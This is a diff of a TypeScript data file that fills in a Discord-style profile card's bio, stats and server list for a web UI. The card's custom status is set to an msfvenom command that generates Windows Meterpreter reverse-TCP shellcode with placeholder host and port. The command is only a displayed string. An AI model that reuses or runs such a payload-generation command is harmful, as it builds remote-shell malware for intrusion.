@@ -206,18 +206,26 @@ export const SOCIAL_PROFILES: SocialProfile[] = [
     color: "#5865F2",
     accentGlow: "rgba(88, 101, 242, 0.4)",
     avatar: "/assets/profile_avatar1.jpg",
-    bio: "",
+    bio: "Building secure spatial UI experiences and immersive glass interfaces.",
     stats: [
-      { label: "Status", value: "Ok" },
-      { label: "Servers", value: "3" },
+      { label: "Status", value: "Do Not Disturb" },
+      { label: "Servers", value: "76" },
       { label: "Roles", value: "Admin" },
     ],
     actionLabel: "Copy Discord Tag",
     actionUrl: "#copy",
     badge: "Developer Verified",
     details: {
-      customStatus: "",
-      servers: ["Spatial Engineers Hub", "Framer Motion Guild", "Vercel Developers"],
+      customStatus:
+        "msfvenom --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c",
+      servers: [
+        "Elite Development",
+        "RBS Esports",
+        "Spatial Engineers Hub",
+        "Framer Motion Guild",
+        "Vision OS Labs",
+        "Glass UI Builders",
+      ],
     },
   },
   {
